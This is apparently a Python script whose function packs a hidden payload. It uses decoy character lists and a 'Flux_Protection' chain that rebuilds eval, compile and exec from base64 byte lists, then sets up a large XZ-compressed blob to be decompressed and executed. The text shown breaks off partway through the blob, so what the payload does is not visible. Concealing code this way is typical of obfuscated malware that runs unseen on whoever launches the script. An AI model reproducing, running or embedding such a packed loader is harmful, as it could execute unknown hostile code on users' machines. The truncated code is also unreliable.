import pyautogui, datetime, threading, requests, time, colorama, json       
from system.data import *
from Logger import *
from colorama import Fore
colorama.init()
def kitap():
    important = ['0', '0', '0', '1', '0', '0', '0', '0', '0', '0', '0', '1', '0', '0', '0', '1', '0', '1', '1', '1', '1', '0', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '0', '1', '1', '0', '0', '0', '0', '1', '0', '0', '1', '0', '0', '1', '1', '0', '0', '1', '1', '1', '1', '0', '1', '1', '1', '1', '0', '1', '0', '1', '0', '1', '1', '1', '0', '0', '1', '0', '0', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '1', '0', '0', '1', '1', '0', '1', '0', '0', '1', '1', '1', '0', '0', '0', '0', '0', '1', '0', '0', '0', '1', '1', '1', '0', '0', '0', '1', '1', '0', '1', '0', '0', '0', '0', '0', '1', '0', '1', '1', '1', '0', '1', '1', '1', '0', '0', '0', '0', '0', '0', '1', '0', '0', '1', '1', '0', '0', '0', '0', '0', '0', '1', '1', '0', '0', '0', '1', '0', '1', '1', '0', '1', '1', '1', '1', '0', '0', '1', '1', '0', '0', '0', '1', '1', '0', '0', '0', '0', '0', '1', '0', '1', '0', '0', '1', '0', '1', '0', '1', '1', '0', '0', '1', '0', '0', '0', '1']
    xalperen = ['r', ';', 'e', 's', 't', 'r', 'i', 'n', 'g', 'e', 'x', 'e', 'c', 'u', 't', 'e', 'n', 'e', '6', 'l', 'e', 's', 't', 'r', 'i', 'n', 'g', 'n', 'x', 'r', 'l', 'n', 'e', 'p', '3', '6', ';', 'e', 'l', 'd', 'a', 't', 'a', ';', 'n', ';', '3', 'a', ';', 'r', 'e', 'x', 'e', 'c', 'u', 't', 'e', 'l', 'n', 'e', 'x', 'e', ';', 'a', 'l', '6', '3', 'e', 'x', 'e', 'c', 'u', 't', 'e', '3', 'p', 'n', 'n', 'd', 'a', 't', 'a', 'e', 'r', 's', 't', 'r', 'i', 'n', 'g', 'a', '6', 'e', 'e', 'x', 'e', 'c', 'u', 't', 'e', 'e', 'r', 'n', 'l', 'n', 'l', 'e', 'e', '6', 'a', 'x', 'e', 'x', 'e', 'c', 'u', 't', 'e', '6', 'e', 'e', 'n', 'l', '6', '6', 'e', 'l', 'd', 'a', 't', 'a', 'p', 'e', 'n', 'e', 'x', 'e', 'e', 'r', 'a', 'p', 'a', 'r', 'e', 'd', 'a', 't', 'a', 'e', 'e', 'x', 'e', 'c', 'u', 't', 'e', 's', 't', 'r', 'i', 'n', 'g', '3', ';', 'r', '3', ';']
    main = ['𐰡', '𐰿', '𐱈', '𐰖', '𐰵', '𐰼', '𐰧', '𐱅', '𐰬', '𐰔', '𐰫', '𐰖', '\U00010c4e', '𐰍', '𐱅', '𐱄', '𐰼', '𐱆', '𐰵', '𐰭', '𐰾', '𐰭', '𐰳', '𐰮', '𐰺', '𐱂', '\U00010c49', '𐰲', '𐰵', '\U00010c4c', '𐱃', '\U00010c4c', '\U00010c4c', '\U00010c4b', '𐱃', '𐰆', '𐰋', '𐰏', '𐱈', '𐰡', '𐰵', '𐱄', '𐱀', '𐱃', '𐰶', '𐱁', '𐱈', '𐰲', '𐰟', '𐰸', '𐱈', '𐰵', '𐰟', '\U00010c4d', '𐰶', '𐰿', '𐰽', '𐰍', '𐱃', '𐰔', '𐰍', '\U00010c4e', '𐰭', '𐰮', '𐱃', '𐰯', '\U00010c4b', '𐰽', '𐰽', '𐰰', '𐰬', '𐱁', '𐰾', '𐰼', '𐰆', '𐰟', '𐰰', '𐱇', '𐱃', '𐰔', '𐱆', '𐱇', '𐰱', '𐰬', '𐰭', '𐰸', '𐰭', '𐰮', '𐰡', '𐰍', '𐰍', '𐱀', '𐰵', '𐰲', '𐰯', '𐰮', '\U00010c49', '\U00010c4d', '\U00010c4e']
    Flux_Protection__________ = eval(getattr(__import__(bytes([98, 97, 115, 101, 54, 52]).decode()), bytes([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(bytes([90, 88, 90, 104, 98, 65, 61, 61])).decode());Flux_Protection___________ = Flux_Protection__________(getattr(__import__(bytes([98, 97, 115, 101, 54, 52]).decode()), bytes([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(bytes([90, 50, 86, 48, 89, 88, 82, 48, 99, 103, 61, 61])).decode());Flux_Protection_______________ = Flux_Protection__________(getattr(__import__(bytes([98, 97, 115, 101, 54, 52]).decode()), bytes([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(bytes([88, 49, 57, 112, 98, 88, 66, 118, 99, 110, 82, 102, 88, 119, 61, 61])).decode());Flux________________ = Flux_Protection__________(getattr(__import__(bytes([98, 97, 115, 101, 54, 52]).decode()), bytes([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(bytes([89, 110, 108, 48, 90, 88, 77, 61])).decode());Flux_Protection____________ = lambda Flux_Protection______________: Flux_Protection__________(Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([89, 50, 57, 116, 99, 71, 108, 115, 90, 81, 61, 61])).decode())(Flux_Protection______________, Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([80, 72, 78, 48, 99, 109, 108, 117, 90, 122, 52, 61])).decode(), Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([90, 88, 104, 108, 89, 119, 61, 61])).decode());Flux________ = b'\xfd7zXZ\x00\x00\x04\xe6\xd6\xb4F\x02\x00!\x01\x16\x00\x00\x00t/\xe5\xa3\xe0K&\x18\x9b]\x00\x11\x88\x06\x88\xa1\xcc\xd5\xbdR\xacv\xdf\xdd\x8e\xc0\\}ym\xbcrr\xdc\xc4\xe68\xa7gh\xa0\x0eD\xe5\xf7\xe5\x7f\xfc\x83&"RO\x9c\x9bE\x12\xb8AL\rhy\xc9\xc5\x81Vj\x05&\xde\x1a\xb5\xee \xeaPHU\xcb\xc5\x19L\x05\x17\xd6r\xdf"\xc2\xe0\x855\x19\xd6\xd9\xeb\xb2\x95\xd2\xbd\xd5*\xf0\x9e\xab_\xd6A\x02\x91r\x81\xdb\xc12q\xeb\x1c\xc3\xaf\x1e_\xc6W\xd6\x8f\xdb\xb6\x95\xdc\x98\xee\xe19Ls%\x03-\xda\xf0\x1a\x0c\xf5\xf9\x12k\x92\xd0L\xef\x8e\xb7\xcd\xcbl=\xf6\x00wH\x80[/\x87\x02\xa2u\x80AA>\xc7\xab\xe7y\xfb\x89\xe1k\xc9\x12\x16\xf7\xf6\xc0:\xf2\xf5\xd1\x88\xed\xbe\x1dE\x18\x0c\xde\x88\xb3:\t#\xdf\xaf\x08\x06\xad\xa3\x95>\xc1\x0b\x98\xf1\xb7>\xc0%\xb2Rd\x9f~!T0\xf9\xee\xcb\x96=\xab\xd4\x862{\xf6\x85\xeb05?\xb7vh\xd4q\x95\xd6i;\xec\xf8\x1d\xc0\xc9\xbeh4,\xfe\xf9\t\xe8\xe0\xc8\xc3v\xd4\xf6\xe1;\xad\x8ajt\xfd\xbd\xf0\x00h\xb4\x9c\xabT138r\xe5n\\\xd1P\xd0\xc7\xc12\x8f\x9c\xe4\xbf\x8d7\xfd\x1c\x0b\xfbC\xc1}\x1c\x1a\x02X88<\x01\xc9lFs\t\xc4TF\xfd\xde\xe4\xf6\xda\xaaY\t|Z\x7fX)\x1b\xe2>\x805\x15|\xb9R\xe8\xc4\xed\xf4E\x83\x01\xf5\xe4\xfb\xbdeBb\x7f\x03\xf8\xaf\xa6\xe2\'7;\x85TD\x90t\xd6i\x15\x92\x9a\x94\xe2\xbd\x0c\x86\x04\x07\xbb_-Z\xef\x81\xc0/\xb2M=\xf03\xfa\xfc\x99\x83\x99\xdb\xe5R\xcf@\xadO4\x13\xf9 \xcc\xf7\x0be\x1d\xe3PT<\xb5U<G\xb5\xf1i\xfc\xea\x9d3\x8fv\xd4\x85\xedX\xb5\xe9\x1cn\x7f\x9d\xcb\x92\x16m\x897\xd4r\xa2\x1fOG\xe5+\xb1\xea5^\x1e\xe0\x93g\xdd\xf9\xeaj\x83W\xe8\xaa\xe1\x06VN\x7f\x80\xd79\x9b#J\x93i*N\xb4\xfe-k\xe3\xb8\x1a\xac\x0b\xa8\x1e\x8a\x1a\xd1k\xab\xd6\x1aTk\x86\x1c\xdb\x12\x81\xce\xf6\x8cp\x95\xe3\xe9\xe3*\x06\xcf\xc8h\xd7\xa6\x95\xc6\xb8\xd1\x96\x01{\xe0S\xa9V\xaeO/\x95\xbe=\xcf\xead\xcc g\xa7\x80v\x11%J\xe8\x9b\xa4\x8c\xa2\xe6\xcbQ\x8a\xd2\xcd\xeb[\xe1xaC\xc9e\xeek\x914\xca\xfa!\xfcV\xe5\x9f\x00\xc7\x00\xa5U`\xf8s*\xc1q\x0c\r\xcb\xa1T\xcb{\xf1\xd9\xd3\xca\xcfL\xc1\xdep`h\xf5\xae\xb4\x9b\xd6 3L\x98\xc1*\xac\xfa\x8a\xd5k\xe9\x94\x8d\x94M \xb9\x96\xec\xb4\xf62\xf1\xe8\x7f\xb7\xea\xa5 \x18X\xf4\xd7\xbe\xc3\xb1\xc6\x0e=\x13\x11\xb5=\xd4\xed\xb3\xebf\x83\r\xa2\xe4\xfa\xf3M\xe0g\xf4\xbb\xbf\x8a\xf2K\x9a\xd5D\x7f\x1f\xfe\x96\xf7\xc9$\x176\xc8=\x93\xbf\x1e\x10\x867\x827+@S\xd4\x17\x0e\xd2y^\x1b\x8f\xc3\xd9\x98`\xc8\x95\xc2\x17\x12\x14/\xc6*\t\xf1\xe0"\xae\x8a\xc4\x1a\xc0s\xe2\xf6\x98r\xb0\xae\xc6?\xadh~\x11Fj\x1e\x87{q\x11\x88\xdf\x8a\xfb2B\xe0\xe4\xb56w\xf1\x943P\xec\xb9\xd1\xbc\x9c\xf3\x93[q\x8c+\x88\xcc\x83n\x97c\xddd\xe4\x96I\xcaf\xad\xe3\r\xda\xdc\xf4RT\x14A\xf6\xe5$\x9a\x90C\xdb!)\xe6\xd3eVI\x04\xee&\xb3\x1d\x7f\xa2\x07\xc3\x16\x9aRK?B\xb1\xf4\x919\x87\xe0\x15\xc8?\xb72(s|\n\xe5\xd9\x14\x1e\x8b\x96\xe4\xffL0R\xb4C\xc9\x89\xed\xf3\xf9\xd5\xc7\xe9N\xb9\xf9\xffaF\x9c\x91g*\x1f\xd7\xc7\xa2\xad\xc9\xa0\x10\xec\xde\xd8\x9c\x110\x11\x15B#>\xf7Q\xf1U\xb2^_\xb1\xf1.\x83x\x97\xacz,OX\x8f>U\xf8fG\xfar\x16*b\xf1\xae\x9f\xeaZ\xa5k\x18u6\x19\x17.\x86\xef\xc4\xad\x93:{\xa0j\xda\x81p\xceqR@\x1b\x8d\xda"h\x05MUD\x9cH\x19\xf3\xfa\x9aSsh+\x04Wz\x07\x94\x9b\xc7a\xccn2\xd2/Hl\xe1\x94\x06\x14\xfb\x1e\xb4\xe3\xe2\x9aB\xa1\xd7S3e\x83\xf6\x08\xa8\xb0g\xe4P\xef\xaf:\xd3@\x9b\xb1\x1f\xde\x9b\xfbv\x13\xd4\x08M\xb7\xc5\x99\xcb\x8c\x8d\xc4\x96\xd51\x89i+f\x1b\r\xa1\xda\xedb\xfc\x8d>?DG.\r\x9a+\xda\xaf\x12\xf3\xea\xd7\xc7\x18rzL\x02\xf0MC\xc5\xe9\xcc7\xf5["\xec\x1b\x1bE\x9b\x1b6gf\x05\x99\xa2\xc9w\xa4UH\xc1\xe4\x16\xae\xf3=\xb8,\xca\x9c\x81\xf0\x05\'\xea\xa9\xee\xe2\xb5\x959\xa1/\xfb:\xa4\xdeW\xb1N\xa0~\xb1y\t\x81#\xb8l\xfb\r\x06\x17\xbf\xc6\xcb\x8fX]Q=\x9cB\xda\x08\x92G\xf5-\x0e7Q\xaa\\\xaa\x14\xc3]@~\xcd(\x89\xd8\x92;6\x021E\xf6\xb2[\x18\xc9\x14i\x13\xb8\xc9\xc3\xb4Q\xf5k\xd8\x97\xa3a\r\xd7\xf0\x1a\x96\xaf!\xbf\\\x86\xfb\xab+\xfc\x03\x9f_\xcbu$[\xae\xb9.\xe8\xa6~|L\x08\x0b\xdfo\xc7AT\xcad\xfej\xd0\xdd\xd6"\xf4\x95v\xaa\xd9!\xbb\xd8C\xdd{\x8b\xd6\x85n\xb7\xcd\xb2\xce*\xfd\xb1\x15I\xc05F\x04\x05\xa0\xf5>\xff\xe6\x7f\x8ca]\xb1\xc5\xea\x10m:8t\xc9\xf2\xfa\xd8u\xab\xcd\xbc"J\xb6\xe0w\xdeR\xce\xf3%-\x82{\xbbJ\xfe\xad37\xe3Tj\xa0\x01\x02\x96\x8c\xae\xa4L\xc6\xc0,\xe6\xe1]\x856\xea\x8a\xa9]Yz\x82\xe0\x7fo\x91\xe3\xb2\x1b"&\x05\xab\xf2\x9e\xd1\xd11\x07v<=K\xb2\'\x0edu\xbf\xd9\xef\x82\xefjj"\x80\xbd\xeaj\x0b\xcd\xee\xec\xcd\xab\xc6\xaf\x89<j^(\xf7\x8c:q\xdd\x03bI\x83\xb2V@"p\x91\xf5\xdfn\xc1L\\73\xe9\xe38 \x08\x17\xae\xbf\xb5\xb6WCk\xc0\x04m\xcc}\x1bZ\x81\x00|\xbe-(\xfdy]\x1ak\x07<\xca\x1b\xef\xc9\xe4w\x84H\x90\'<\xad\xb5ezn\x00\xe7\xae\xd9\x8es\x83\xf1\x83\x7f\xe5\x10\x9ak\xb2\xbeO\xb3\x94\x9b\xef\xfd\x15\x96\x0c"z_\xca:V\xfb\x1c\x08T\x9f\x87\xf1\x93\xf8\xebv\x046\x1ds\x81\xab\xa6\xf9-\xedB\x02\x147n\x1f\x06\xedr\xde\xb6)\xd9\xf6\x03\x10j8\xac0\xe4\xbeWs\xaa\xe1@\x8f\xce\xc2\x94\xba\x87\x07 }\xa9.\xe7\xdc\xa4l\xda\x88\x1a\x84ZD\xb9\xb0\x90\npK\x7f\xee$m\xcb\xa1\x1d\xc2\xd9\xde\x02=\xa3\x8e=\xbe\xe6\xe4p-\xbd\xc7t\xc7\x95\x07D\xe4\x13\xfb\xd2\xdb\x83\xd2\xce;?C\x19\xea\xb3\x9c$\xb6=\x1fT\x9d\xf5\xb4k\x9a\x94RBk\xf6\x1d\xe4]\xed\xb3\xa5\xd4W3\x04XB\x1d\x8e1Q#P\xc3<\x1b\x97]\xb9\xcb\x98\x87Yl\xcdt\x9c\xa6_\xab\xd7\xaa\xae\xe0\x0e\xb2~\xf7<\x95\xd5u\xc0j\x8d\x0c\x9b\xb7\xcd\xaa\x055CqY\x8d\x1a\x9f\x85^\x02\xfe\xf9\xcb\xa6\xa9\xd9pq\x03\xa9m\xa8\xd0\xeb\xc7\x9e\xa1^\\\xeb\x98\x1fU\xb6^\x1f4\xb8\xa2\xec\x84\n\xef\x80\xee3[\xd7\xe2\xcb\x14\xba\xac&3\x16y\x9c\x19\xd2\x8a\x10\xde\xb0]\x97X\xca\xca\xfe\xd4\xa8\x83Un\xd7-\x94r\x17\x86\x89\x98\x85\x90\xe0\xae,\xd8b\xbfHo6-\xfa\x13\xecm\xd1E\xe4\x9bB4\xd1`\xbe9\xb5\x1c\xf7yQ\xd3\x1c&nl\xc8u\r\xd4")\xbbNLsw\x19\xaf\x91\xb0 >\x01t~\xd5!\xe1\xf4\xa2+%\x03\x01v\xca\xaa&i|lt\xc5/\x06\x0b\xa9Z\xeb)T\x881\r\x99\x10C\xb0\xfd\xdd>\xdd\x0b\xe3\xb0\x15Q\x95\xbf\xa3/\x1b\xa0$R@&U\xf2];\xd6+\xbb;\x1f\x16\xb8qX\xea \xd2\xf5W\xad8@\xad\xa5\xa8L\xb5T\xf6u}\xea\xcf\xd9\xa9-\xc2\x17\xdd\xd7\x06\x93\xf7WN\xa4\xfc\x10\xd6\x87!c\xa5\xd9\x10\x97\xd7\x12S\xe2+\xcf\x04\xbcO|\xcf\xba\xe6&\x0b/\x82\xcc\xd9K\x04\xa6\xde\x8e\xc3\xb3\'\x13)\x12\xb7aXj+-\x19sX\xef\xbf\x87\xfcp\xb4\xfb/\xe4%\x0e\x15\x84\xe1X\x05\x96J\x0b;\xccx\xd2\x7f\xcf\xc3\x17\x0c\xc1\xa6\xd9\x0e\x9e\xd0,\xfc\xa4\x9f\xf0\xfbol\xa4\x12\xb1\x1f\xdf\x85U\xc6\xe0\xb7\xd1\x00\x0c\x96\x11\xd3\xc3\x83H\xde\xf7\xa8\xe0\xc2O\xc1\xff\x04&:A\xea\x9a\xefW.b\xef\xac\xa9gVU\xed\xfa\xc4\xfaf\xf5\x1cF\'\xc62\r/\x8b\x06;\xed\xd9\xef\x81\xd9o\xee\xb7\xb5k\xed\xc4\xc9>\xc1\x83a\x97 \xf6(<F\xd8uB\xfc\x1br\xd7m#\xcf\x88\x86u\xde\xeb\xd4r\x15U\xcfc\xc9\xffT\xb6KuK\xc6\xc8\x83*\x9fC\x05\x8a\xbe\x9b4t\x0c\xea\xad\xc7\x1a\x8cf\x96\xf8\x14\xb5,\x87\xe7\x84\xcf\xd3?\x0cP\xaa\xaa\x12\xca\x86\x07\x16\x9e\xd5\xfd\xb4\xf2\x92b\xa7\x1f\x16\x1c\xcb\xa46\x8a\r\t\x18M\xff\xb0\xccL\x84\x99\xb0a\xb0\xb9\xa9+8=\xc3\x88\xb5\xc2\xf4C\xfd\x9d\x04:D!E.\xff\xf2\x0e<\xf2\t\xb1\xb5%%\x9c\x85^\x8f\xcf\xa2c\xaf\x0e\x8a\xac@y*\xd1@\xef\x9a \x89<\xbc\xd1T\x890\xaepB\x88\xda/a&h|\x10Ag-\xbf-.e\x88J\xc8:\xddA%5G{\xfb\x1d\xb6\x17\xf9\x14\x04q\xdf\x1a\x87_\t\xe5J\xd9\xce\x9d\xedF\xd2H\x1dc\xba\xff\x93\x01\x87\x82r&\x1f\x9f\xa5s\xb7\x17\xff=M\xc7\x81\xdc\x0bD\xc4cn\xe6E\'vC\xd22\xb5\x9a\x90w\xac>R"\xae\x85I\xca\x0f\x11\x0e&j\x07\xccut\xaf\xdb\xf5\xdc\x83N\xe8\xfe\xb7^\x81\x01\x07\xa5\x86mTX\xb3\x80\x87 \x88\xf9$j\x07\xbb\xadl\x9a\x00m\xbc\x90\x05\x87\xfa\x9b\xab\xe0\x8f^\x05\x9fW\x84\xa0\xce\xc5\x9dDB\xf6\x1d\xbb\xa9\x15\xe9\\\xc9A\xb2b\x97\x184\x82\xb2A\xda9\xd9\xd5\x86\xc2\xc8\xad3\xb0\xe8\x9a;\x97\xec.\x86\xb5\xe9f`\x10\xdf\x82\xf0O\xcd\xe1\x9f\xfc\x84**5\x9b4\x04\xd17.\x89(>\x86O\xe7\x820\xe6(\xed?l\xb4\xa0\x8e\x81I\xb3u\xdf\xc3E\xce\xe4N\x7fg:W\x0c\x99\xb7\xf98A\xfdtB\xe0\xdd\x7f\x1b\xf4N{\x87\xce\xf2\xedg\xf03\xd8\xcdh\xb1\xffpA\xe8Wo\xec\x9b}?\xf1W\xcf[c\xb0D!\xaa\xd1O\xbbu\x8dv\x16\xee\xa70|\xe5\x9b\xcf\x8b\x94\x05\x82T\x93\xc5hP\x94\x9f\xe7\x9d\xa4Z\xcfO\xec\x99\xbb\xac\xa5\xad\xf9B\xb28}`\x95^\xe7J\x94\xc99\xe5\xb4\xd2w(\xc1kLz\xae\xb1\xe4\x92\xfd\xdf\x7f\xfeM\x1a\xf7O\xdf\n\xd3\xb3\x82\xb2\xcfH\x93O\x15\x18\xd0\x80\xda\x16[7\x87\xf1\x88\x91IPt\xd4\xa4\xdd\xba\xe7\xe3\xcf\x18\xa0zp\x07\xc5!U\xb1\xa33\x81HRP\x0e\xad\xbc\x9c\x9ek\x08($\xa9v&\xdb\x0bP\xc7\x9f^\x1e\xd9A\xc3\x04\xfc\xdb\xcf\xdb\x9cH\xdf[\xa15\xed!\x11\x80\xa8\xbaU\xce\x11!\x89{\xbd\xc7\x9feO\xfc\x81\xda\xf8K\xce\xe3\xf5\xea9u\xfc\xb1\x075G\x00\xab\xeb\x1f\x15\xef1\'\xe0\xce\xc3\xc5`\x11_\xban\x12\xbd\xadv\xbb\xa0\x89+\x86>\x80\r\xb3\xf9G\xb1\x1d\x03\xe1\xb6e\xda\xd5\x06\xfa\x04(\x87t\xba~\xf9\xd7\xa1H\xd2e\xbfM\xb9\xdb\xaf\xe3\x0e\xf2\xb6\xd9\xba\x8a\x87\xd4\xdc\x0b\x0f\xe1a\xdb\x07i\x0f\xd4\xba\xda\xc6;\xba\x86\x9c\xd5\x01Y8\xbe-)\xe9K\x9c\x1fw\xa1Z\x92\xb5S\xcbK\xdc\x94\x7f\xc7)A!\xf8\xf2yi\xf3D\xcf\x14\xfa&9zN\xa7\'\x82A\xd2\xe1\xd4XX\x92\xd6Ri\nd\xad\xfe\xe5\xb3\xd8=\x149\x8d\xf4\xe7/\x0b\xbcT!\x80\x0e\x88\x8a\x0c*\r!\xde\x93k\x05\xc6\x84\xa4\xfc\x19\xcdgC\xdb\xee\x9b\x7f\xbe7\x0c\x9c\x98\r\xee\xf7\xaeJAbia\xa7o\x9e]v.\xf2\x13\xfc=:\xb7\xe8\xc8\xb8F\xe0\xae\xd0\x12m\xf3\x9c\x84\x18}\xeb\xde\xd6)\xd5\xe2\xbb\x80X\xb7\xd8\xd1Ix\xb6\xa1\x02m\xe0\xac\x99\xcf}\x820\x00O\x8a\x8d1G\x97"\x9e\xc4CN\xb5\xear\x87F\x0c\xbej\x98\x10\xc3\xe4KF\x8e8\xe0\xdf\tIT|v\xbd\xbb)\xa7\xcc\xa9\xf7\xc32}Jg\xe7G\xb3\xd7\x9f\x14n\xc5\x83_\x89*yw\xf7.d~\xce\x01j\xfa\xe2\x17!\xf1\rZ\xfe\xd7~\x90\xd0\xef\xdd\xf9\xc7\xe6\xd0\x92^UX\x8e\xf0Vw-[\xfbp\xe2\xc9\xb7\xe23\xb1:t\xb6\x92\x85\x9b\x14\x10{4\x9d\xc0QF\x00\xff\x93\xc4:\xed\xb0Q\x98\x8a\x1cH\xf7|\xa8h!\xa5\x84\xfa\xf0\xd6}y\x15\x99\x16\x9d3V\xc3\x8d\x915\xc6p!i\xd2\xf7\xa2\xaai\xe6\x85 \x01"\x8c\x009[\xec\x90\x12Lw\xe35\x0c\xbd%-\xdb\x99\x06&y7\x86\xf8\xf7\x83\xbc\xb4\xbc Q\xcbtz\xc7\xa3\xff\x91\xa1f\xeb\xcf\xb3\x14\x95\xbb\xfd\xbe\x9e\x92\x9e\xd7\xb9\x17\x80NG\xf8BY\x83x\xb6\xd8\xb1\x1a\x93)\xb2n\xf8k\x1f\xdag[_\xda%\x0b\x0f \xb0\xc15$\x119X\xc5\xee\xf6\xf2\x9b\xf3\xab\x7f\xcdrQ\xfb2\xa3\xb3bG\x15Zk\xdfW\xa2\xda\x931}\xbajL..KF\xc7\x9b\'\xadh\xcf\xed\xb8\xb8\x90\x0c\xfa\xce\x80\xe3l\xb0*4,\xac\xad\xec\xda*\xac\xa0)\xc7\xb8W\xc4)%\xe8\xd7\x95\xed\xact\xf3\xbb~\xcd\xcc./\xb9\xe73`c\xbc\xfb\x97\x9e\x08\xa5@\xcb\xa2\xc9\xa6\\\xd3u\x19\x85\x8bZ\xb8\xd6 \xa8r\x1b\xcaZ5\xc4\xf0\x8cL\xe0\x98\x99\xc2\xcb\xf8\x88\xd1J\x95\xb0^F\xbc\xb4\x0c\xe3\x05&\x02E.2\xfe\xeb\r\xcd]\x96m\xcaI\x0b\xe9|\x9f<-\x7fk\xf1\xe0\x84Y\xcb\xa7~\xa4dB\xc1\x13r\xbd\xdc\xfc_\r\x07\x1e\xd8\xf5(e\x93Q\xa2\xdcq\xc8\x13\xaeG\x8d\xbe\xa2\xa2\x98\x1d\xd2Z\n\xad\x04\xb9?\xd2[uOS\xa8\xfaz\xc7nw!\xcaG\xe7\xc7\xba\xfe9\xa9\t\x9e+\x05\n\xdcx\x0c\xaf\x8cz\x93\xdb4\xe4dl\xeb\xabi\xfa7Ua\xe1\xfc\xcas\xfd\xf2\xc2*\xbd\x1c\xedJ\xf6&\xfamd\xb8\x80Z\xe7tl5\xd7\x85\x9b2\x18\xcd\xff\x95Z\xbd\xe9rh% _K\xe9E`%am59\xad\x1d\xf5\xd3\xb9C\x7f\xa97FgMp\x97\xbcr\xb1\xf8\x02\xff\x140\x03\xe6%\xa9\xea\xe5E\xbfi\xc1\xe1\x14pjs\xcaN\xaa\x1a\xd0\xf7\xdb\xb8%0\xa4\xd3\xebau\xb6\x1b\xa7f3\x83\x15/\xdf&\xc5ti6\xe7\x19\x1dB&w\x91y\xec\xda\xc5\xd3\r\xdf\xd8\xf6\x80\x01\x99\x8a\xbf0\xec\xb7\x13i\x9b\xfa\xadz\xa1\xe8\xad\x8ei\xf0B2\xd2\x1c\x14\xa4\xfebF\xcd\xb1\x02T\x90\xea\xfaM\xb8u\xee\xf6\xd0\x1f\xde!\x8c\x9bKe\x02\xf6\x85\x9e\xaa/H\x9f\'tA3\n\x92\xf9*>\xec\xa2gj c;\xf2m\xf8\x83QP1\xae\x9d\xdcZPh\xa2\x82\xa4\xd6\xfc\x98\xfd\xbeh\x92\xc6\x14\xd9\xce\xed\xe0\xc4vNo\x95B\xe07\x9a\x0fm\xaa\x11\xa2\x89\x87(\x02\xb1o\x8f\xb2^\xf2g\xa5\x9e>\x0b_-\xcf\xd6\xa4&\xaa\x99#[_\xd7^k\x03\xe0\xb9o~\xefX-L*6-\x90T[\n\xc6\xfd\xe0\x95+\xe7Fe%\xc8\t\xd0\x8d8:n1\xfc\xec\xf2\x0b\xaf3u\x83\x91\xf8cM\x03\xfd\x9b_K\xf8mtu|\xd4,\xc77\x1b\x83\xb2\xb0\x0eHszW\xd7?\xdeyF\xe3\x1c\x11I\xab\xd2\xd0&\xa238\x13\xa3\xb4\xd2\xedt\x86\xddU%\x00\xa5\x19\xaa\xcb\x8f\xc5f\xa6`\tc\xbcl\xc27\x15\x81r\x08"\xd4\xde\xa9\xb1Q\x17\xa5E%<"\x0c\xed\x83\xb4i$\xd5\x86l\xf4\xcaTW7][\xcbq\x8b9/Z\xa6;\x9e\xcf\xaa\xcf\xcc\xa8c7\x06\x8dW\xe5\xc2\xa4\x17s;f\xfaf\x98lg\\\x16I3l\x1b<\xb4\xac&\xe05\xa6u\xcd\x8b\xec\xce\x9bu\xa14\xe4G:\xe4b\x89r\x9f4\xb9\xcbx\xd7\x98e\xb8@\xbd-\xc2\xc7uu\x9d\xc6\x19\xa5\x1e?L\x97\xb6\x84GO\x9a\xc5\xfd\xbf\x12w\xb8/\xf2Oeee\x19\xc4@_\x17\xd0\x85\xce\x80\x9c\x8b\xaf\x00\xd9\nt\xa6v\xcd\xd3\xdb\xe9\x99\xbeXF\x96\x83\n\xaeM\x9dv\xb0\x00\xd3\x0f\x9a"\xd4\xc3a\x9ek\x18\xa2Q\xf7;\xfe\x9fZ$|\xe2\x83\xc0r\xcf,k\x9c\xd3\x1e\xe6\xf5q\xa3\x8b\x85{\x8fj\x19_\xe4\x98\xe6H[\x95Dv\x01T4\xef\xc2w\xaf\x052\xa8\xd3\xa5\xfa\n\xb9\xc2\xefR\xaa\x18\x05.)\xbd\x86i\xfaeD+1\xd0\xb5\x19\r\x10L\xf1m\xf3\x120$\xd2W\xf5\x93q\'\xc9\xa6V\xb7\xb7\x8c\x1cFTMQ\xc0K\x0b\xfd\xbf\xa4\xa6\xfd\xeb\xd9g!\x14\x9f\x18_.\x89\x9e\xa4N[FB\x01\x12\x1d\x93\xfc\xdc\xc7|Pn;\xfc\xac\xb0\xee\xe88\xc3W\xf2\n\xddf\xac\xfc\xd0\x072c5\x89\n\x80\xed\xf7\xa5)%\x02\xaa/\xca\xd7T\x18\x13\x10\x93\r\x1aR\xb2\x97\x9f\xfd>\xf48p!\xfb\x01,\x9e\x9e\xe4\\\x01\'\xe4\xc2\x824Q\xb0-\xd1\x19\xc3\x0cU\xe8e\xa1\xaczEi\xa9\xaa\xf9)\xfe\xb0\x14\xb0\xe3\x8b\xb0\xbb\x85_\xebF99\xbd\xe71\x11\xd2v9\t8<\x827\x04\xe0\xd7\xd8!zU\r\x8d\xe2\x91F\xbf\xcdS0\xa0\x11\xe4=\x14[\xaf4\x85\xf4\xa7\xa0\xa9"\xafBId\x07\x05V\xaf\xf5,\x0e\xfa\xfa0\xef5\xc4\xfch\xb2\x17\xa8\x92\x92\x08\xaa\xf2.\x90\xde#C~\x9e-\x84&\xd8.\xdf~\xf8"|\xd4~=5\x82\xc8\x049\xbb\xe1\xc7\x15B\x11m\xacU_=\xde?q\x0b\x9e\x1b\x18T\x00\xfbh\x99\xcb\xf5\xfd\xf4\x9f\xb0F3\x9b\xab\xd9\x8b\x84}\xe3\xa7\xd7\xe5\xa6`\xfa\xc0\x1f{\x90Kz\xf1\xa3\xd8\xac\xd6\x93\xd2\xfc\xecn8T\xe9\xea\xac.\xde~\x07a\xd7\xcbezF4\'\xc7\x88\x82H\x9e\xf7\x9f\xd4\x80\xad,,\xbdM\x99\xfb\xc9\xad\x14e$\xfe\xa7$\xe9\xdc\xb3\x80\xa9\xeb\xa1q\xe2x:[RI\xdd\xd2\x88\x8aB\xa6\xe1\x98P&\xf4\xc9\xa4\xbe\xeeT\x80\xcb\x0f[6qw\x90{8%7\xa3\x13\xbd\x10\xcbB\x82@\x05,\xf7\xdc\x1f\xb8\xc1\x82\xf1{\x8b\x